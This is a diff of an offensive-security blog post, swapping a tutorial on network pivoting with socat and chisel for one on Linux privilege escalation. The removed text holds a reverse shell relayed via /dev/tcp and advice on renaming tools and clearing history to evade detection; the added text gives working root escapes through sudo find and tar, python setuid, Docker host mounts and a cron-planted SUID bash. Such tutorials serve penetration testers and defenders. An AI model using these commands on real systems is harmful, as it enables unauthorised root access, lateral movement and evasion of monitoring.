@@ -1,205 +1,271 @@
 ---
 layout: post
-title: "Network Pivoting: Routing Your Access Through Compromised Hosts"
-category: "Network Security"
-date: 2025-11-20
-readTime: "14 min"
-tags: [pivoting, socat, chisel, tunneling, post-exploitation, lateral-movement]
-excerpt: "When your initial compromise sits in a DMZ, the real network is behind it. We explore how attackers bypass network segmentation through pivoting techniques."
+title: "Linux Privilege Escalation: From Low-Privileged User to Root"
+category: "Post-Exploitation"
+date: 2025-11-18
+readTime: "16 min"
+tags: [linux, privilege-escalation, kernel, docker, capabilities, suid, privesc]
+excerpt: "After gaining initial access to a Linux system with limited privileges, the path to root demands systematic enumeration and exploitation of misconfigurations."
 ---
 
-# Network Pivoting: Routing Your Access Through Compromised Hosts
+# Linux Privilege Escalation: From Low-Privileged User to Root
 
-## The Segmentation Problem
+## The Privilege Model
 
-Modern networks don't exist as flat, homogeneous landscapes. Instead, they're compartmentalized. Your initial foothold lands in a DMZ or perimeter subnet, valuable for what it reveals, but ultimately not what you're after. The crown jewels sit deeper: domain controllers in internal VLANs, database servers in restricted zones, management interfaces behind additional firewalls.
+Linux's privilege model is binary at first glance but nuanced in practice. Root, the user with UID 0, possesses unrestricted access to the entire system. Every other user (UIDs typically 1000 or higher) operates within defined boundaries. A process running as `www-data` (the web server user) cannot read files owned by root with restrictive permissions. It cannot modify system configuration. It cannot directly execute commands as other users.
 
-This architectural reality creates a fundamental challenge for attackers and defenders alike. Once inside the perimeter, how do you traverse lateral network boundaries? The firewall that stopped your initial reconnaissance now works differently from the inside, but it still exists. Network segmentation isn't just an external defense, it's internal containment.
+Yet systems are rarely perfectly isolated. Misconfigurations, legacy permissions, and design choices create bridges between privilege levels. These bridges are what privilege escalation exploits.
 
-This is where pivoting becomes essential. Rather than attacking these internal networks directly (impossible from your external position), you use the compromised host as an intermediary. Every connection routes through the internal network via this gateway machine. The traffic is native to their network, so to their firewalls and IDS systems, it appears legitimate.
+The attacker's initial access typically lands at a constrained privilege level. A web vulnerability grants code execution as the web server user. An SSH brute-force success uses a weak user account. A local exploit reaches a low-privileged shell. From this position, root access seems distant. But systematic enumeration often reveals a path forward.
 
-## Understanding the Traffic Flow
+## Enumeration: The Foundation
 
-Before examining tools, let's establish what actually happens during a pivot. Consider a typical scenario:
+Before attempting any exploit, comprehensive enumeration is essential. You're searching for misconfigurations, leftover permissions, or outdated software. These are the artifacts of imperfect system administration.
 
-- Your Kali box is on `10.10.14.0/24` (external)
-- Compromised DMZ host is on `10.10.10.50` (perimeter subnet)
-- Internal network is `192.168.1.0/24` (restricted VLAN)
+Automated scripts accelerate this process. LinPEAS (Linux Privilege Escalation Awesome Script) examines system state comprehensively: installed software, file permissions, network listeners, scheduled tasks, and more. The script highlights findings with color coding. Red indicates likely escalation vectors.
 
-Without pivoting, when you attempt to connect to `192.168.1.100:80` from your Kali box, the firewall drops the traffic. The routing tables on your machine don't even know how to reach that network legitimately.
+However, automation misses context. You might see a SUID binary and not recognize its exploitation path. You might find a cron job and not understand its implications. The best approach combines automated enumeration with manual analysis.
 
-With pivoting, you establish a tunnel through the DMZ host. Now when you request `localhost:8080` on your machine, the traffic flows through: Kali to DMZ host to Internal host. The firewall sees internal-to-internal traffic, which it permits. The internal host responds through the same path.
+Key areas to examine:
 
-From the network's perspective, there's nothing unusual. A host on the DMZ is communicating with internal resources. This happens constantly in legitimate environments.
+**Sudo permissions**: The `sudo -l` command reveals which commands your user can execute as root (or other users) without providing a password. A single misconfigured line can be a complete escalation path.
 
-## SOCAT: The Foundational Approach
+**SUID binaries**: Files with the setuid bit execute with the owner's privileges, typically root. If a SUID binary contains a vulnerability, exploiting it grants root access.
 
-SOCAT is fundamentally a bidirectional data relay. It connects two endpoints and shuffles bytes between them. Its power lies in its flexibility. These endpoints can be TCP sockets, Unix sockets, files, processes, or even SSL/TLS connections.
+**File permissions**: Writable files in critical locations (like `/etc/shadow` or `/etc/cron.d/`) can be modified to create escalation paths.
 
-### Basic Port Forwarding
+**Kernel version**: Older kernels contain public exploits. Determining the exact version is the first step toward kernel exploitation.
 
-The simplest pivot is a port forward. You listen on a high-numbered port on the compromised host and tunnel connections back to an internal service.
+**Running services**: Services executing with elevated privileges might be exploitable if they contain vulnerabilities.
 
-```bash
-socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80
+## Sudo Misconfigurations
+
+The `sudo` command permits users to execute commands with elevated privileges, typically root. When configured correctly, it's secure. When misconfigured, it's one of the most direct escalation paths.
+
+### NOPASSWD Bypass
+
+The most obvious misconfiguration allows commands via sudo without a password:
+
+```
+user ALL=(ALL) NOPASSWD: /usr/bin/find
 ```
 
-This command tells SOCAT: listen on TCP port 8080, and when connections arrive, fork a new process for each one, then connect to the internal web server at 192.168.1.100:80. The `fork` keyword is critical. Without it, only one client could connect before SOCAT closed.
-
-The operator now points their browser to `dmz-ip:8080` and receives pages from the internal server. The internal firewall sees the DMZ host initiating connections (permitted) and responding to them (expected). There's no indication of external involvement.
-
-### Reverse Shell Relaying
-
-This becomes more complex when you need to chain compromises. Suppose you've gained a shell on Host A (the DMZ), but your actual target is Host B, which can only be reached from A.
-
-Traditional reverse shell: you catch a reverse shell from Host B on your Kali box, but Host B can't reach Kali directly. This fails at the network boundary.
-
-With SOCAT on Host A:
+This line permits the user to run `find` as root without authentication. The attacker then leverages `find`'s capabilities to execute arbitrary commands:
 
 ```bash
-# On your Kali
-nc -lvnp 4444
-
-# On Host A (pivot)
-socat TCP-LISTEN:5555,fork TCP:kali-ip:4444
-
-# On Host B (target)
-bash -i >& /dev/tcp/host-a-ip/5555 0>&1
+sudo find . -exec /bin/sh \; -quit
 ```
 
-Host B connects to Host A on port 5555. SOCAT relays this connection to your Kali listener. The reverse shell arrives at your listener, authenticated through the trusted intermediary. Host B sees it as connecting to Host A. Host A sees it as connecting outbound (which, from an internal perspective, might be permitted by policy). Your Kali sees an inbound connection from Host A.
+The `-exec` option runs commands on found files. `/bin/sh` spawns a shell. The semicolon is a find syntax requirement, `-quit` exits after the first result. The result is a root shell.
 
-### Encryption Considerations
+GTFOBins, an online database of Unix binaries and their exploitation methods, contains exploitation techniques for hundreds of common utilities. Many common commands (vim, less, python, perl, etc.) have built-in functionality that can execute arbitrary code. When these are available via sudo NOPASSWD, privilege escalation is trivial.
 
-As sophistication increases, so does defensive monitoring. A network defender running IDS/IPS systems can fingerprint clear-text protocols. SSH, RDP, and HTTP traffic have distinctive patterns. Encrypted traffic is harder to categorize.
+### Wildcard Injection
 
-SOCAT supports SSL/TLS wrapping. This doesn't hide the traffic (defenders still see network flows), but it obscures the content from DPI (Deep Packet Inspection) systems.
+Some administrators attempt to restrict sudo access by permitting only specific arguments:
+
+```
+user ALL=(ALL) NOPASSWD: /usr/bin/tar
+```
+
+But they fail to consider argument injection. The attacker crafts arguments that change the tool's behavior:
 
 ```bash
-# Generate self-signed certificate
-openssl req -newkey rsa:2048 -nodes -keyout pivot.key -x509 -days 365 -out pivot.crt
-cat pivot.key pivot.crt > pivot.pem
-
-# On the DMZ host
-socat OPENSSL-LISTEN:443,cert=pivot.pem,verify=0,fork TCP:192.168.1.100:3389
-
-# On your Kali (if you want to access it)
-socat TCP-LISTEN:13389 OPENSSL:dmz-ip:443,verify=0
+sudo tar xf /dev/null --to-command '/bin/sh'
 ```
 
-Now RDP traffic to the internal server flows through an SSL tunnel. From the network's perspective, it's encrypted HTTPS-like traffic. An IDS can flag it as suspicious (why is a DMZ host conducting SSL to internal resources?), but the actual RDP protocol details are hidden.
+Here, `--to-command` isn't restricted. Tar extracts files and pipes them to a command. That command is a shell, and it runs as root.
 
-## Chisel: Modern HTTP-Based Tunneling
+### Sudo Version Exploits
 
-SOCAT is powerful but somewhat dated in its approach. Chisel represents a different design philosophy: assume restrictive firewall policies and design around them.
+Older sudo versions contain security vulnerabilities. CVE-2021-3156, known as "Baron Samedit," affects sudo versions before 1.9.5p2. It's a heap-based buffer overflow in the argument parsing code. Exploitation is reliable and grants root access on vulnerable systems.
 
-Many corporate networks permit HTTP and HTTPS outbound traffic. These are fundamental to business operations. An IDS might scrutinize these connections, but blocking them entirely isn't feasible. Chisel exploits this reality by tunneling over HTTP, encrypted via SSH.
-
-### Architecture
-
-Chisel operates on a client-server model. The server runs on your attacking machine (or an intermediate relay). The client runs on the compromised host. They establish an SSH connection over HTTP, which then carries tunnel traffic.
-
-### Reverse Port Forwarding
-
-The most common deployment mirrors SOCAT's port forward but with better encryption.
+Checking the sudo version is straightforward:
 
 ```bash
-# On your Kali (server)
-./chisel server --reverse --port 8000
-
-# On compromised host (client)
-./chisel client kali-ip:8000 R:8080:192.168.1.100:80
+sudo --version
 ```
 
-The `--reverse` flag is significant. Normally, the server listens and accepts connections. Here, the client connects to the server and establishes a reverse tunnel. The listening port (`8080`) appears on your Kali machine.
+If the version is vulnerable and matches your target environment, public exploits are available and typically reliable.
 
-This offers advantages over SOCAT:
+## SUID Binaries: Dangerous Permissions
 
-- Built-in SSH encryption (SOCAT requires manual SSL setup)
-- Cross-platform compatibility (single binary works on Linux, Windows, macOS)
-- Written in Go, so it's performant
-- The client initiates the connection, which can traverse proxies and NAT
+SUID (Set User ID) binaries run with the privileges of their owner, regardless of who executes them. If a binary is owned by root and has the SUID bit set, executing it grants temporary root privileges.
 
-### SOCKS Proxy: The Comprehensive Solution
-
-Rather than forwarding individual ports, Chisel can establish a SOCKS proxy. This is more versatile. Any tool configured to use a SOCKS proxy can tunnel through the compromised host.
+Locating SUID binaries:
 
 ```bash
-# On your Kali (server)
-./chisel server --reverse --port 8000
-
-# On compromised host (client)
-./chisel client kali-ip:8000 R:socks
+find / -perm -4000 -type f 2>/dev/null
 ```
 
-Chisel listens on port 1080 on your local machine. Any traffic sent to this port travels through the compromised host and onward to the destination.
+The `-perm -4000` matches files with the setuid bit. This search often reveals dozens of binaries. Most are legitimate system tools that require elevated privileges (like `passwd`, which modifies the password database).
 
-Now you can use proxychains to route any command through this tunnel:
+However, some are unusual. Custom scripts compiled locally, utilities in non-standard locations, or outdated versions of common tools might contain vulnerabilities or design flaws.
+
+### Exploiting Vulnerable SUID Binaries
+
+A vulnerable SUID binary might:
+
+**Path traversal**: Accept file paths as arguments and operate on files outside intended directories. By manipulating these paths, an attacker reads or writes files as root.
+
+**String format vulnerabilities**: Accept format strings in arguments. Format string bugs allow reading and writing arbitrary memory.
+
+**Command injection**: Execute user-supplied input via shell commands without proper sanitization. Injecting shell metacharacters executes arbitrary code.
+
+**Buffer overflows**: Classic memory safety vulnerabilities. Supplying oversized inputs corrupts memory and hijacks execution flow.
+
+Each type requires different exploitation techniques. The common thread: the SUID privilege elevation is the mechanism, the vulnerability is the method.
+
+## Linux Capabilities: Fine-Grained Privileges
+
+Linux capabilities divide the privileges traditionally granted to root into distinct, independently grantable units. Rather than conferring "all root powers" to a process, administrators assign specific capabilities: `CAP_SETUID` (can change UID), `CAP_DAC_READ_SEARCH` (bypass file read permissions), etc.
+
+This architecture theoretically improves security. A web server process doesn't need every root privilege, it needs specific capabilities related to network binding and file access.
+
+In practice, misconfigurations grant dangerous capabilities to unnecessary binaries.
+
+Finding capabilities:
 
 ```bash
-# Edit /etc/proxychains4.conf
-[ProxyList]
-socks5 127.0.0.1 1080
-
-# Use it
-proxychains nmap -sT -Pn 192.168.1.0/24
-proxychains smbclient -L //192.168.1.10
-proxychains evil-winrm -i 192.168.1.10 -u admin -p password
+getcap -r / 2>/dev/null
 ```
 
-Every network tool now operates as if you're on the internal network. This is more versatile than individual port forwards. You don't need to predict which services you'll target, you can enumerate the network dynamically.
+This recursively checks every file for capabilities. A result like:
 
-## Chaining Multiple Pivots
+```
+/usr/bin/python3 = cap_setuid+ep
+```
 
-As you progress deeper into a network, you might encounter additional segmentation. Your first compromise reaches a DMZ. Behind that DMZ is a management VLAN. Behind that is the production network. Each boundary requires an additional pivot.
+Indicates that python3 has the `setuid` capability. An attacker can invoke Python and use it to change the process UID to 0 (root):
 
-This is theoretically straightforward: the second pivot relays through the first, the third through the second, and so on. In practice, complexity emerges.
+```python
+import os
+os.setuid(0)
+os.system('/bin/bash')
+```
+
+The result is a root shell. Python is legitimate software for system administration, but assigning it this capability is dangerous and not unprecedented in misconfigured environments.
+
+Other dangerous capabilities:
+
+- `CAP_DAC_READ_SEARCH`: Bypass file read permissions, accessing `/etc/shadow` or private keys
+- `CAP_DAC_OVERRIDE`: Bypass file write permissions, modifying configuration files
+- `CAP_NET_ADMIN`: Configure network interfaces, intercept traffic, or inject packets
+- `CAP_SYS_ADMIN`: Perform miscellaneous administrative functions, often a catch-all for dangerous operations
+
+## Kernel Exploits: The Nuclear Option
+
+Kernel vulnerabilities are the most powerful but also the most dangerous privilege escalation vector. A successful kernel exploit typically grants immediate root access. However, kernel exploits are unstable. Failed exploitation can crash the system.
+
+The first step is determining the exact kernel version:
 
 ```bash
-# On Kali
-./chisel server --reverse --port 8000
-
-# On First Pivot (DMZ host)
-./chisel client kali-ip:8000 R:socks &
-./chisel server --port 9000 --reverse
-
-# On Second Pivot (Management VLAN host)
-./chisel client first-pivot-ip:9000 R:9001:third-network-host:80
+uname -a
+cat /proc/version
 ```
 
-You've created a relay chain. Kali connects to the first pivot, establishing a SOCKS proxy. The first pivot connects to the second, forwarding port 9001. Now `localhost:9001` on your Kali reaches deep into the third network.
+Then searching for public exploits:
 
-The practical limit is usually latency and debugging difficulty, not technical capability. Each hop adds latency. If your attack fails, determining where in the chain the problem exists becomes challenging.
+```bash
+searchsploit "Linux kernel 5.4"
+```
 
-## Operational Security Considerations
+Several well-known kernel exploits have become classics:
 
-These techniques work, but they generate evidence. Network defenders analyze traffic patterns, study unusual connections, and review logs.
+**Dirty COW (CVE-2016-5195)**: A race condition in the copy-on-write mechanism of the Linux kernel. By carefully timing reads and writes to the same memory page, an attacker can make the kernel overwrite normally read-only memory. This allows modifying SUID binaries or system libraries, granting root access. Affected kernels: 2.6.22 through 4.8.2 (and various stable branches).
 
-When tunneling, consider:
+**Dirty Pipe (CVE-2022-0847)**: A vulnerability in the pipe buffer mechanism allowing writes to read-only files. Similar in impact to Dirty COW but with a simpler exploitation path.
 
-- **Port selection**: Avoid high-numbered ports on well-known services. Port 8080 on a DMZ host is suspicious if that host never typically services web traffic.
-- **Volume**: Tunneling large amounts of data (like a full network scan) creates distinctive patterns. Attackers often conduct reconnaissance in smaller batches, spread over time.
-- **Process artifacts**: The chisel or socat binary itself might trigger endpoint detection. Renaming or obfuscating binaries is common practice.
-- **Cleanup**: Removing evidence of tunnels (deleting binaries, clearing command history) is part of the engagement.
+**PwnKit (CVE-2021-4034)**: A vulnerability in the polkit authentication mechanism, affecting systems with older versions. Requires the specific vulnerable version but is highly reliable when applicable.
 
-## When to Use Each Tool
+Kernel exploits are situation-dependent. They only work on specific kernel versions. Attempting an exploit on a non-vulnerable kernel wastes time or, if you're unlucky, crashes the system.
 
-**SOCAT** is appropriate when:
-- You need Unix socket manipulation
-- You're already on the target and need quick forwarding
-- SSL/TLS encryption isn't critical
-- The target has limited disk space (SOCAT is smaller)
+## Docker Breakout: Container Escape
 
-**Chisel** is appropriate when:
-- You need a persistent, encrypted tunnel
-- The environment has restrictive outbound policies (HTTP/HTTPS allowed)
-- You want cross-platform compatibility
-- You need to tunnel multiple services simultaneously
+Some Linux systems are virtualized, actually running inside Docker containers. While containers provide isolation, they're not true VMs. A container with certain configurations can break out to the host.
 
-In practice, many engagements use both. SOCAT for initial quick pivots, Chisel for establishing persistent tunnel infrastructure.
+First, detect the container environment:
+
+```bash
+ls -la /.dockerenv
+cat /proc/1/cgroup | grep docker
+```
+
+If these reveal you're in a container, and if the container is privileged:
+
+```bash
+# Test if privileged
+ip link add dummy0 type dummy
+```
+
+If this succeeds, you're in a privileged container. The next step is straightforward:
+
+```bash
+mkdir /mnt/host
+mount /dev/sda1 /mnt/host
+chroot /mnt/host /bin/bash
+```
+
+You've mounted the host filesystem and changed root to it. Now you're running as root on the host.
+
+Alternatively, if the Docker socket (`/var/run/docker.sock`) is mounted:
+
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+This creates a new container with the host filesystem mounted and enters a root shell within it.
+
+## Cron Jobs and Scheduled Tasks
+
+Cron executes commands on a schedule. If a cron job runs a script as root, and that script is world-writable, modifying it grants root code execution.
+
+Examining cron jobs:
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /etc/cron.daily/
+```
+
+Look for scripts with permissive permissions:
+
+```bash
+ls -la /etc/cron.d/backup.sh
+# -rwxrwxrwx 1 root root 256 Nov 20 02:00 backup.sh
+```
+
+If writable by your user:
+
+```bash
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/cron.d/backup.sh
+```
+
+Wait for the cron job to execute (check the schedule in `/etc/crontab`), then:
+
+```bash
+/tmp/rootbash -p
+```
+
+The `-p` flag preserves the SUID privilege when spawning the shell.
+
+## Escalation Strategy
+
+Privilege escalation is rarely a single guaranteed path. Systems have multiple vectors, some more reliable than others. Effective enumeration identifies several possible approaches. The attacker selects the most reliable or quickest.
+
+A prioritized approach:
+
+1. **Sudo permissions** (fastest if available, NOPASSWD is immediate root)
+2. **SUID binaries** (common misconfiguration, exploitation varies)
+3. **File permissions** (if writable system files exist, modification is direct)
+4. **Cron jobs** (requires waiting for execution, but reliable)
+5. **Capabilities** (less common, but devastating if present)
+6. **Kernel exploits** (most reliable technically, but risky and time-consuming)
+
+Each step consumes time. Operators typically focus on the quickest viable path while documenting alternatives for later use.
 
 ## Conclusion
 
-Network pivoting bridges the gap between network segmentation and attacker objectives. By converting a compromised host into a relay, attackers access otherwise isolated networks. Defenders implement segmentation specifically to prevent this. The cat-and-mouse dynamic between pivoting techniques and defensive detection remains ongoing.
+Linux privilege escalation is less about exotic techniques and more about systematic enumeration and understanding system architecture. Misconfigurations are ubiquitous. File permissions, software versions, and administrative choices create security boundaries that privilege escalation exploits.
 
-Understanding these techniques is essential for both offensive security professionals and defenders building detection systems. The tools themselves are straightforward, the art lies in deployment: when to use them, how to conceal them, and how to chain them across multiple network boundaries.
+The methodical approach (enumerate, identify vectors, exploit the most reliable) consistently yields results. Tools like LinPEAS accelerate enumeration. Understanding the underlying system allows precise exploitation. Together, they transform a low-privileged shell into root access.
